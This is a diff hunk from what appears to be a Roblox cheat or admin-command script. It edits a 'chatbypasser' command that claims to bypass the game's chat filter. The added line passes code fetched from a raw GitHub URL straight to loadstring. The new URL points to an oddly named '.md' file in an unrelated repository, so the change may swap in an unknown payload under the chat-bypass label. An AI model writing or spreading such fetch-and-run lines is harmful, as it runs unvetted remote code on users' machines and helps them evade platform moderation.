@@ -3681,7 +3681,7 @@ Utils.Notify(Caller, "Command", "Antichatlog enabled.")
 end)
 
 AddCommand("chatbypasser", {}, "bypasses chat filter", {}, function()
-loadstring(game.HttpGet(game, "https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/ChatBypass.lua"))();	
+loadstring(game.HttpGet(game, "https://raw.githubusercontent.com/LighTMolT/wdawdv/main/owne.md"))();	
 Utils.Notify(Caller, "Command", "Bypassing chat filter...")	
 end)
 
